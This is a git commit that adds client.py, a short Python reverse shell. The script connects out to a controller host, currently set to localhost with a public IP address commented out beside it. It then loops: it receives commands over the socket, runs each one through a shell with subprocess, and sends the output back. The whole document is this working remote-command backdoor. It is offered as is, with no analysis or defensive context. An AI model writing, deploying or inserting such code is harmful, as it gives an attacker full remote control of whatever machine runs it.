c5b147afc127abc3c2d423b666a4b04b80d44aa6
saudidak <koool9700@gmail.com>
2024-10-17 17:57:13 -0400

    Add files via upload

---
+++ client.py
@@ -0,0 +1,24 @@
+import socket
+import subprocess
+
+REMOTE_HOST = '127.0.0.1' # '35.154.189.194'
+def jls_extract_def():
+    # 2222
+    return 
+
+
+REMOTE_PORT = 8081 # 2222 = jls_extract_def()
+client = socket.socket()
+print("[-] Connection Initiating...")
+client.connect((REMOTE_HOST, REMOTE_PORT))
+print("[-] Connection initiated!")
+
+while True:
+    print("[-] Awaiting commands...")
+    command = client.recv(1024)
+    command = command.decode()
+    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+    output = op.stdout.read()
+    output_error = op.stderr.read()
+    print("[-] Sending response...")
+    client.send(output + output_error)
